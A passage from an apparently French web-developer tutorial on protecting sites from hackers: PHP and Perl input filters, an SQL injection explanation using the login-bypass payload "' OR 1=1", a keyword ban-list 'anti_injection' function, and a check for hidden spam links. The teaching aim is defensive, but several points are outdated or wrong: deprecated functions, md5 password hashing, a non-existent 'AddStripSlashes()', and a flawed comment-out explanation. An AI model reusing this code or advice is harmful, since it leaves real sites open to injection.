<span style="color: #19177C">$variable</span> <span style="color: #666666">=</span> trim(<span style="color: #008000">stripslashes</span>(<span style="color: #008000">htmlentities</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;variable&quot;</span>])));

<span style="color: #408080; font-style: italic">/* pour un filtrage plus restrictif */</span>
<span style="color: #19177C">$variable</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.&amp;=]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;variable&quot;</span>]);
</pre></div>
						<p>Ceci est une protection générale qui fonctionne contre les formes les plus simples de piratage.<br>
						Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
						<p>À partir de PHP 5.2, il existe une série de filtres qui permet de bien cibler le filtrage des données&nbsp;: <a href="https://www.php.net/filter">https://www.php.net/filter</a>.</p>
						<a id="filtreperl"></a><hr><br>
						<header>
							<h2>Sécuriser un script PERL</h2>
						</header>
						<p>C'est comme pour l'article précédent sur le php. Si vous utilisez un petit script en PERL qui traite les données d'un formulaire ou d'une variable dans une URL comme “/index.cgi?page=23&amp;id=machin” (donc utilisation des requêtes GET ou POST), il faut filtrer ces données pour éviter toute faille.</p>
						<p>J'utilise ce bout de code que je mets en tête du script afin de filtrer toutes les données qui y entrent&nbsp;:</p>
<span class="smallfont">Code Perl&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #19177C">$val</span> <span style="color: #666666">=</span> <span style="color: #19177C">$ENV</span>{<span style="color: #BA2121">&#39;QUERY_STRING&#39;</span>};
<span style="color: #19177C">$val</span> <span style="color: #666666">=~</span> <span style="color: #BB6688">s/%([a-fA-F0-9][a-fA-F0-9])/pack(&quot;C&quot;, hex($1))/eg</span>;
<span style="color: #19177C">$val</span> <span style="color: #666666">=~</span> <span style="color: #BB6688">s/&lt;([^&gt;]|\n)*&gt;//g</span>;
<span style="color: #19177C">$val</span> <span style="color: #666666">=~</span> <span style="color: #BB6688">s/([&lt;&gt;\&amp;\$;:\`\|\&quot;\&#39;*\?\!\~\^\(\)\[\]\{\}]|\\|\.\.|^\/)//g</span>;
</pre></div>
						<p>D'abord, on décode les caractères non alphanumériques qui sont encodés en url-encoded. Puis, on efface les caractères qui peuvent poser des problèmes comme des balises html et certains signes à la 4e ligne du code ci-dessus.<br>
						Ceci est une protection générale qui fonctionne contre les formes les plus simples de piratage.</p>
						<p>Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
						<a id="injectsql"></a><hr><br>
						<header>
							<h2>Contrer les injections SQL</h2>
						</header>
						<p>Cette attaque vise les serveurs web en cherchant les erreurs de programmation des scripts ASP, CGI et PHP, ces mêmes scripts exécutant des requêtes SQL. Si vous ne programmez pas, inutile de vous y attarder, il s'agit ici d'une piqure de rappel aux programmeurs.</p>
						<p><strong>Qu'est qu'une attaque de type SQL injection&nbsp;?</strong></p>
						<p>SQL (Structured Query Language) est un langage de base de données utilisé par nombre de CMS, blog, wiki, Gallery, etc. C'est un langage basé sur des requêtes utilisant des instructions telles que INSERT (insertion de données dans la base de données), DELETE (pour en supprimer), UPDATE (pour en mettre à jour), SELECT (pour en sélectionner et lire), et bien d'autres. Mais cette simplicité fait d'elle aussi une proie facile aux détections de failles.</p>
						<p><em>Exemple de requête&nbsp;:</em></p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">mysql_query(&quot;SELECT * FROM users WHERE login = 'toto';&quot;);</pre>
						<p>Cette requête sélectionne l'utilisateur (extrait de la table “users”) dont le login est “toto”. “SELECT *” signifiant qu'on sélectionne tous les champs de cette table. L'exemple ci-dessous est une attaque de type SQL injection afin de récuperer un mot de passe, c'est l'attaque la plus courante. Ma page contient un formulaire d'identification utilisateur classique où l'on entre un identifiant et un mot de passe. La requête associée à ce formulaire permettant de vérifier que les login / password entrés sont valides par rapport à notre base de données serait&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">mysql_query(&quot;SELECT * FROM users WHERE utilisateur = '$login' AND motdepasse = '$password'&quot;);</pre>
<p>Cette requête aurait pour effet de sélectionner l'utilisateur en question si le nom d'utilisateur ET le mot de passe entrés sont dans notre base de données. Si l'un des deux est erroné, la requête ne renverra aucun résultat.</p>
						<p><em>L'attaque en question</em></p>
						<p>Sachant que dans mon exemple la variable $login contient ce que j'ai tapé dans mon premier champ de texte et que la variable $password contient ce que j'ai tapé dans le deuxième champ de texte (le mot de passe), voici ce qui arrivera si j'entre le code suivant dans le premier champ Identifiant (ou login)&nbsp;: ' OR 1=1&quot;); // , la requête est&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">mysql_query(&quot;SELECT * FROM users WHERE utilisateur = '' OR 1=1&quot;); //' AND motdepasse = '$password'&quot;);</pre>
						<p>Et elle permettrait certainement d'identifier l'utilisateur avec succès, car la requête est vraie si un utilisateur '' existe OU si 1=1. Comme l'utilisateur <em>vide</em> n'existe pas, mais que 1 est égal à 1, alors la requête est vraie et valide. Donc, en ajoutant ce code, on force à croire que n'importe quelle requête est vraie. Le signe “//” signifiant un commentaire en PHP, le reste du code n'est pas interprété, il est rendu inutile. Et vous voilà avec un accès à la base de données&nbsp;! Ceci est l'exemple le plus simple, il en existe bien d'autres qui permettent de véritablement prendre le contrôle d'un serveur en se faisant passer pour root ou l'administrateur. Les possibilités sont malheureusement nombreuses. Nous ne les développerons pas.</p>
						<p><strong>Comment se protéger des attaques par injection SQL&nbsp;?</strong></p>
						<p>Pour prévenir ces attaques, il faut connaitre la programmation. Si celle-ci est bien réalisée, les attaques ne sont plus possibles. Voici quelques conseils&nbsp;:<br>
						Évitez d'utiliser un compte ayant tous les pouvoirs pour l'exécution de votre serveur SQL.<br>
						Supprimez les fonctions que vous n'utilisez pas telle que&nbsp;: master..xp_cmdshell, et de manière générale toutes celles commençant par “master..xp”.<br>
						Vérifiez les entrées utilisateurs telles que les champs de texte. Vérifiez aussi que les nombres attendus soient bien des nombres avec une fonction telle que IsNumeric() par exemple.<br>
						Vérifiez aussi à bien filtrer les paramètres des URL qui sont ajoutables manuellement.<br>
						Utilisez les caractères et fonctions d'échappement tels que AddStripSlashes() en PHP, voyez les caractéristiques de la fonction et, en général, les documentations de vos langages de programmation pour plus d'informations. Cela empêchera l'entrée utilisateur du caractère ' en l'échappant à l'aide d'un slash le précédant.<br>
						Empêchez d'une manière générale certaines séquences d'entrées utilisateurs telles que “;”, “insert”, “select”, “//”, “--”, etc.<br>
						Limitez le nombre de caractères qu'un utilisateur peut entrer dans un champ de texte, car ceci peut fort bien lui compliquer la tâche.<br>
						Attention à ce que vous mettez dans les cookies, car un mot de passe (même crypté en md5) est vite trouvé par une attaque de ce type. Par la suite, un remplacement de cette valeur dans le cookie évite à l'attaquant une attaque de type force brute&nbsp;; c'est donc un joli cadeau.</p>
						<p><strong>Application concrète</strong></p>
						<p>La méthode la plus simple est de filtrer toutes les variables en appliquant les filtres php comme ceci&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">/* pour un filtrage de base */</span>
<span style="color: #19177C">$variable</span> <span style="color: #666666">=</span> <span style="color: #008000">mysql_real_escape_string</span>(<span style="color: #008000">htmlspecialchars</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;variable&quot;</span>]));
</pre></div>
<p>Voici un petit script pour éviter les injections SQL dans un formulaire d'identification (identifiant et mot de passe) à adapter suivant vos formulaires&nbsp;:</p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">anti_injection</span>( <span style="color: #19177C">$user</span>, <span style="color: #19177C">$pass</span> ) {
<span style="color: #408080; font-style: italic"># on regarde s&#39;il n&#39;y a pas de commandes SQL</span>
    <span style="color: #19177C">$banlist</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span> (
        <span style="color: #BA2121">&quot;insert&quot;</span>, <span style="color: #BA2121">&quot;select&quot;</span>, <span style="color: #BA2121">&quot;update&quot;</span>, <span style="color: #BA2121">&quot;delete&quot;</span>, <span style="color: #BA2121">&quot;distinct&quot;</span>, <span style="color: #BA2121">&quot;having&quot;</span>, <span style="color: #BA2121">&quot;truncate&quot;</span>,
        <span style="color: #BA2121">&quot;replace&quot;</span>, <span style="color: #BA2121">&quot;handler&quot;</span>, <span style="color: #BA2121">&quot;like&quot;</span>, <span style="color: #BA2121">&quot;procedure&quot;</span>, <span style="color: #BA2121">&quot;limit&quot;</span>, <span style="color: #BA2121">&quot;order by&quot;</span>, <span style="color: #BA2121">&quot;group by&quot;</span> 
        );
    <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #008000">eregi</span> ( <span style="color: #BA2121">&quot;[a-zA-Z0-9]+&quot;</span>, <span style="color: #19177C">$user</span> ) ) {
        <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> trim ( <span style="color: #008000">str_replace</span> ( <span style="color: #19177C">$banlist</span>, <span style="color: #BA2121">&#39;&#39;</span>, strtolower ( <span style="color: #19177C">$user</span> ) ) );
    } <span style="color: #008000; font-weight: bold">else</span> {
        <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">NULL</span>;
    }

    <span style="color: #408080; font-style: italic"># on regarde si le mot de passe est bien alphanumérique</span>
    <span style="color: #408080; font-style: italic"># on utilise strtolower() pour faire marcher str_ireplace()</span>
    <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #008000">eregi</span> ( <span style="color: #BA2121">&quot;[a-zA-Z0-9]+&quot;</span>, <span style="color: #19177C">$pass</span> ) ) {
        <span style="color: #19177C">$pass</span> <span style="color: #666666">=</span> trim ( <span style="color: #008000">str_replace</span> ( <span style="color: #19177C">$banlist</span>, <span style="color: #BA2121">&#39;&#39;</span>, strtolower ( <span style="color: #19177C">$pass</span> ) ) );
    } <span style="color: #008000; font-weight: bold">else</span> {
        <span style="color: #19177C">$pass</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">NULL</span>;
    }

    <span style="color: #408080; font-style: italic"># on fait un tableau</span>
    <span style="color: #408080; font-style: italic"># s&#39;il y a des charactères illégaux, on arrête tout</span>
    <span style="color: #19177C">$array</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span> ( <span style="color: #BA2121">&#39;user&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$user</span>, <span style="color: #BA2121">&#39;pass&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$pass</span> );
    <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #008000">in_array</span> ( <span style="color: #008000; font-weight: bold">NULL</span>, <span style="color: #19177C">$array</span> ) ) {
        <span style="color: #008000; font-weight: bold">die</span> ( <span style="color: #BA2121">&#39;ERREUR : Injection SQL détectée&#39;</span> );
    } <span style="color: #008000; font-weight: bold">else</span> {
        <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$array</span>;
    }
} <span style="color: #408080; font-style: italic">// ##########</span>
<span style="color: #19177C">$login</span> <span style="color: #666666">=</span> anti_injection (<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;pseudo&#39;</span>],<span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;pass&#39;</span>]); <span style="color: #408080; font-style: italic">// on lance la fonction anti injection</span>
<span style="color: #19177C">$password</span> <span style="color: #666666">=</span> <span style="color: #19177C">$login</span>[<span style="color: #BA2121">&#39;pass&#39;</span>]; <span style="color: #408080; font-style: italic">// on recupère le pass</span>
<span style="color: #19177C">$password</span><span style="color: #666666">=</span><span style="color: #008000">md5</span>(<span style="color: #19177C">$password</span>); <span style="color: #408080; font-style: italic">// on met le pass en md5</span>
<span style="color: #19177C">$pseudo</span> <span style="color: #666666">=</span> <span style="color: #19177C">$login</span>[<span style="color: #BA2121">&#39;user&#39;</span>]; <span style="color: #408080; font-style: italic">// on recupère le pseudo</span>
<span style="color: #BC7A00">?&gt;</span> 
</pre></div>
						<a id="piratesavoir"></a><hr><br>
						<header>
							<h2>Avez-vous été piraté sans le savoir&nbsp;?</h2>
						</header>
						<p>Vous avez un CMS, blog ou e-commerce&nbsp;? Vous avez peut-être été piraté sans le savoir par des pirates qui veulent mettre des liens vers leurs sites web afin d'augmenter artificiellement leur Pagerank.<br>
						Attention, c'est très sérieux. C'est un piratage invisible, presque bénin, mais bien réel. Si vous trouvez les éléments décrits ci-dessous, votre CMS, blog ou e-commerce a été piraté par des professionnels payés pour cela, non par des gamins qui s'amusent à effacer des sites en mettant leurs pseudos à la place. <br>
						Connectez-vous à votre phpMyadmin.<br>
						Une fois identifié, dans la colonne de gauche en haut, cliquez sur le nom de votre base, puis dans la fenêtre principale, en haut cliquez sur l'onglet Recherche.<br>
						Puis entrez l'une des 3 phrases: <br>
						%display:none%<br>
						%height:0%<br>
						%visibility:hidden%</p>
						<p>Si vous trouvez des entrées dans les textes de vos pages ou les commentaires contenant “display:none” ou “height:0” ou “visibility:hidden”, alors vous avez été piraté. Ces liens web vers les sites des pirates sont invisibles mais bien présents dans le code et visibles par les robots indexeurs. Effacez ces liens, changez vos mots de passe, mettez à jour votre logiciel et suivez les conseils dans cet article.</p>
						<p>Et si vous constatez un comportement bizarre de votre CMS, blog ou e-commerce, profitez-en pour vérifier qu'il n'y a pas de nouveaux fichiers ou dossiers ajoutés ou modifiés récemment en installant <a href="#fichmodif">le script décrit ici-même.</a> C'est peut-être votre CMS, blog ou e-commerce qui a fait cela, mais il vaut mieux en être sûr.</p>
					</section>
				</div>
			</div>
			<div class="4u 12u(narrower)">

				<!-- Sidebar -->
				<div class="sidebar" role="complementary">
					<section>
						<header>
							<h2><span class="icon fa-talk fa-lg"></span> Commentaire</h2>
						</header>
						<p>On peut lutter contre les pirates et les hackeurs et protéger son site internet en suivant ces simples conseils. Ils sont assez efficaces pour se défendre des attaques automatiques et donneront du travail à celui qui vise spécifiquement à pénétrer votre site pour diverses raisons.</p>
						<p>Prenez ces conseils comme <strong>une liste de bonnes pratiques</strong> qu'un professionnel doit appliquer au minium. Ici, vous n'aurez que des recommandations relatives à l'hébergement d'un site internet à destination du client et du web-développeur. Vous n'apprendrez pas à protéger un serveur web comme un administrateur système doit le faire, car cela fait partie de sa formation.</p>
						<p>L'idée derrière cette liste exhaustive de conseils est qu'il faut prendre la menace avec sérieux. C'est comme un cambriolage, on prend d'abord des mesures de préventions pour éviter les risques. On sait que l'effraction est toujours possible pour qui s'en donne les moyens et le temps. Maintenant, ce qui dissuade un malfaiteur est justement le temps et l'effort qu'il devra consacrer à casser les protections. Si c'est trop long et compliqué, il passera son chemin. On placera donc toute une série de verrous sur le site internet pour lutter contre ce genre d'attaque.</p>
					</section>
					<section>
						<header>
							<h2><span class="icon fa-users fa-lg"></span> Partager</h2>
						</header>
						<ul class="icons center">
							<li><a href="#dmodale" id="omodale" class="icon circle fa-partage-alt"><span class="label">Lien</span></a></li>
							<li><a href="mailto:?subject=Regarde%20cet%20article%20du%20site%20web%20Silomia&body=Je%20viens%20de%20lire%20cet%20article%20provenant%20du%20site%20web%20Silomia%20et%20je%20pense%20que%20tu%20le%20trouveras%20int%C3%A9ressant.%20%0D%0AVa%20%C3%A0%20cette%20adresse%20%3A%20https%3A%2F%2Fsilomia.github.io%2Finternet-se-proteger-des-pirates-et-hackers.html" class="icon circle fa-envelope"><span class="label">E-mail</span></a></li>
						</ul>
						<ul class="icons center">
							<li><a href="en-internet-secure-protect-from-hacker-attacks.html" class="icon circle fa-language"><span class="label">Lien</span></a> <br><a class="smallfont" href="en-internet-secure-protect-from-hacker-attacks.html">English version</a></li>
						</ul>
						<dialog id="dmodale">
							<header class="tmodale"><p>Copiez l'adresse pour la partager</p></header>
							<p class="smallfont"><a id="lmodale" href="https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html">https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html</a></p>
							<footer class="tmodale smallfont"><button id="cmodale" class="button">Fermer</button> <button id="copier" data-copie=">> Lien copié" class="button special">Copier</button></footer>
						</dialog>
					</section>
				</div>
			</div>
		</div>
	</section>

	<!-- Two -->
	<section class="wrapper style1 container special">
		<div class="row">
			<div class="4u 12u(narrower)">
				<section>
					<span class="icon featured fa-child"></span>
					<header>
						<h3>Tu seras un Homme…</h3>
					</header>
					<p>Re-découvrez le célèbre poème de Rudyard Kipling “Si… tu seras un homme mon fils” qui a inspiré tant de générations. Il célèbre le courage de surmonter les épreuves.</p>
					<footer>
						<ul class="buttons">
							<li><a href="tu-seras-un-homme-mon-fils.html" class="button small">En savoir plus</a></li>
						</ul>
					</footer>
				</section>
			</div>
			<div class="4u 12u(narrower)">
				<section>
					<span class="icon featured fa-trophy"></span>
					<header>
						<h3>J'ai décidé de réussir</h3>
					</header>
					<p>J'ai réuni 10 conseils éprouvés pour trouver la volonté d'accomplir avec succès ses ambitions et franchir certains obstacles dans sa vie personnelle et professionnelle.</p>
					<footer>
						<ul class="buttons">
							<li><a href="decider-de-reussir-sa-vie-changer-evoluer.html" class="button small">En savoir plus</a></li>
						</ul>
					</footer>
				</section>
			</div>
			<div class="4u 12u(narrower)">
				<section>
					<span class="icon featured fa-food"></span>
					<header>
						<h3>Gourmandises</h3>
					</header>
					<p>Des recettes exquises de mignardises (madeleines, financiers, sablés, cakes, muffins) et autres gourmandises (croissants, brioche, gâteaux traditionnels…).</p>
					<footer>
						<ul class="buttons">
							<li><a href="gourmandise.html" class="button small">En savoir plus</a></li>
						</ul>
					</footer>
				</section>
			</div>
		</div>
	</section>
</article>

<!-- Menu -->
<nav id="my-menu" role="navigation">
<!--z><div id="menu" class="wrapper style3 container 75%"><h2>MENU</h2></z-->
<ul>
	<li><a href="index.html"><span class="icon fa-home fa-fw"></span> Accueil</a></li>
	<li><a href="tu-seras-un-homme-mon-fils.html"><span class="icon fa-child fa-fw"></span> Tu seras un homme mon fils</a></li>
	<li><a href="decider-de-reussir-sa-vie-changer-evoluer.html"><span class="icon fa-trophy fa-fw"></span> J'ai décidé de réussir</a></li>
	<li><a href="le-monde-et-l-humanite-doivent-changer.html"><span class="icon fa-baton-lumiere fa-fw"></span> Se libérer du mal</a></li>
	<li><a href="meditation-relaxation-seance-video.html"><span class="icon fa-cloud fa-fw"></span> Relaxation et méditation</a></li>
	<li><a href="contre-la-manipulation-des-masses.html"><span class="icon fa-flag fa-fw"></span> Manipuler la foule</a></li>
	<li class="submenu">
	<span><span class="icon fa-food fa-fw"></span> Gourmandises</span>
	<ul>
		<li><a href="mignardise-madeleine.html"><span class="icon fa-food fa-fw"></span> Madeleines</a></li>
		<li><a href="mignardise-financier.html"><span class="icon fa-food fa-fw"></span> Financiers aux amandes</a></li>
		<li><a href="mignardise-petits-beurre.html"><span class="icon fa-food fa-fw"></span> Petits biscuits au beurre</a></li>
		<li><a href="mignardise-mini-cakes.html"><span class="icon fa-food fa-fw"></span> Mini cakes</a></li>
		<li><a href="mignardise-muffins.html"><span class="icon fa-food fa-fw"></span> Muffins</a></li>
		<li><a href="mignardise-briquettes.html"><span class="icon fa-food fa-fw"></span> Briquettes</a></li>
		<li><a href="gourmandise-croissants-pains-au-chocolat.html"><span class="icon fa-food fa-fw"></span> Croissants</a></li>
		<li><a href="gourmandise-brioche-au-beurre.html"><span class="icon fa-food fa-fw"></span> Brioche</a></li>
		<li><a href="gateau-cake-tere-couque.html"><span class="icon fa-food fa-fw"></span> Tère couque / Cake tendre</a></li>
		<li><a href="gourmandise-crepes-ultimes.html"><span class="icon fa-food fa-fw"></span> Crêpes</a></li>
		<li><a href="gourmandise-caramel-beurre-sale.html"><span class="icon fa-food fa-fw"></span> Caramel Beurre Salé</a></li>
		<li><a href="gourmandise-pate-a-tartiner-chocolat-noisette.html"><span class="icon fa-food fa-fw"></span> Pâte Chocolat Noisette</a></li>
		<li><a href="gateau-tarte-pommes-amankay.html"><span class="icon fa-food fa-fw"></span> Tarte aux pommes Amankay</a></li>
		<li><a href="gateau-streusel-a-la-creme.html"><span class="icon fa-food fa-fw"></span> Streusel à la crème</a></li>
		<li><a href="gateau-strudel-viennois.html"><span class="icon fa-food fa-fw"></span> Strudel Viennois</a></li>
		<li><a href="gateau-kouglof-gugelhupf.html"><span class="icon fa-food fa-fw"></span> Kouglof</a></li>
		<li><a href="gateau-stollen.html"><span class="icon fa-food fa-fw"></span> Stollen</a></li>
		<li><a href="gateau-roule.html"><span class="icon fa-food fa-fw"></span> Gâteau Roulé</a></li>
		<li><a href="gateau-tarte-fraises.html"><span class="icon fa-food fa-fw"></span> Tarte aux Fraises</a></li>
		<li><a href="gateau-rhubarbe.html"><span class="icon fa-food fa-fw"></span> Tarte Rhubarbe</a></li>
		<li><a href="gateau-clafoutis.html"><span class="icon fa-food fa-fw"></span> Clafoutis</a></li>
		<li><a href="gateau-tarte-universelle.html"><span class="icon fa-food fa-fw"></span> Tarte universelle</a></li>
		<li><a href="gateau-mirabelle-quetsche.html"><span class="icon fa-food fa-fw"></span> Gâteau Mirabelle</a></li>
		<li><a href="gateau-cake-pavot.html"><span class="icon fa-food fa-fw"></span> Cake au pavot</a></li>
		<li><a href="gourmandise-riz-semoule-au-lait.html"><span class="icon fa-food fa-fw"></span> Riz au lait</a></li>
	</ul>
	</li>
	<li><a href="business-model-valider-projet-entreprise.html"><span class="icon fa-line-chart fa-fw"></span> Canevas de business modèle</a></li>
	<li><a href="marketing-techniques-secretes.html"><span class="icon fa-shopping-cart fa-fw"></span> 10 secrets marketing</a></li>
	<li><a href="recueil-de-blagues.html"><span class="icon fa-paw fa-fw"></span> Blog de Blagues</a></li>
	<li class="submenu">
	<span><span class="icon fa-code fa-fw"></span> Outils pour WebDev</span>
	<ul>
		<li><a href="internet-se-proteger-des-pirates-et-hackers.html"><span class="icon fa-code fa-fw"></span> Se protéger des pirates</a></li>
		<li><a href="internet-sauvegarde-backup-restauration-web-sql.html"><span class="icon fa-code fa-fw"></span> Sauvegarder un site web</a></li>
		<li><a href="internet-referencement-site-web.html"><span class="icon fa-code fa-fw"></span> Référencer un site web</a></li>
		<li><a href="internet-debug-php-mysql.html"><span class="icon fa-code fa-fw"></span> Débogage de scripts</a></li>
	</ul>
	</li>
	<li><a href="conseils-pratiques-photographie.html"><span class="icon fa-diaph fa-fw"></span> Mémento du photographe</a></li>
	<li><a href="page-de-telechargement.html"><span class="icon fa-download fa-fw"></span> Téléchargement libre</a></li>
	<li><a href="courrier.html"><span class="icon fa-envelope fa-fw"></span> Contact</a></li>
	<li><a href="#0" class="commutateur mode-clair" data-stylesheet="css/styles.clair.min.css"><span class="icon fa-sun fa-fw modestyle clair"></span> <span class="paramBouton">Clair</span></a><a href="#0" class="commutateur mode-sombre" data-stylesheet="css/styles.sombre.min.css"><span class="icon fa-moon fa-fw modestyle sombre"></span> <span class="paramBouton">Sombre</span></a> <a href="#0" id="modecaractopti"><span class="icon fa-font fa-fw modestyle sombre"></span></a></li>
</ul>
<!--z></div></z-->
</nav>

<!-- Footer -->
<footer id="footer" role="contentinfo">
	<ul class="copyright">
	<li><a href="index.html"><span class="icon fa-home fa-fw"></span> Accueil</a></li>
	<li><a href="courrier.html"><span class="icon fa-envelope fa-fw"></span> Contact</a></li>
	<li><a href="en-internet-secure-protect-from-hacker-attacks.html"><span class="icon fa-language fa-fw"></span> In English</a></li>
	<li><a href="menu.html" accesskey="3"><span class="icon fa-align-bars fa-fw"></span> Plan du site <span class="smallfont">[TOUCHE]+3</span></a></li>
	</ul>
	<ul class="copyright">
	<li>&copy; 2007 à 2022 </li><li><a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></li><li><span class="icon fa-code fa-fw"></span> <a href="README.html">Crédits</a></li>
	</ul>
</footer>

<!--z><style>li.submenu{margin-top:1em}li.submenu ul{padding-left:.68em}#header{position:absolute}</style></z-->
</div><!-- page-wrapper -->

<!-- Scripts -->
<link rel="stylesheet" href="css/styles.min.css">
<link rel="stylesheet" id="feuillestyle-active"><link rel="stylesheet" id="feuilleStyleCaract">
<script src="js/script.min.js" async></script>
<script async>function ers(){var e=document.getElementById("page-wrapper").innerHTML.replace(/(<!--z>|<\/z-->)/g,"");document.getElementById("page-wrapper").innerHTML=e}try{eval("(class Foo{})")}catch(a){ers()}</script>

</body>
</html>